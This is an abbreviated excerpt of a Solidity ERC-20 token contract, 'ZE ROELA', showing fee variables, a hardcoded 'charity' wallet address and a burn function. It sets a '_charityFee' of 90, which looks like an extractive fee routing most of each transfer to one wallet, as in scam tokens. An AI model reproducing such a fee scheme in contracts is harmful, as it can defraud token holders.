...
contract ZEROELA is Context, IERC20, Ownable {
    ...
    address private _charityWalletAddress = 0x4B7D98f0Ef8cD316D52D06A9B7F914AB890c0819;
    address private _deadAdd = 0x000000000000000000000000000000000000dEaD;
    ...
    string private _name = "ZE ROELA";
    string private _symbol = "ZE ROELA";
    uint8 private _decimals = 9;
    
    uint256 public _taxFee = 1;
    uint256 private _previousTaxFee = _taxFee;
    
    uint256 public _charityFee = 90;
    ...
    function _takeBurn(uint256 tBurn) private {
        ...
        _rOwned[_deadAdd] = _rOwned[_deadAdd].add(rBurn);
        if(_isExcluded[_deadAdd])
            _tOwned[_deadAdd] = _tOwned[_deadAdd].add(tBurn);
    }
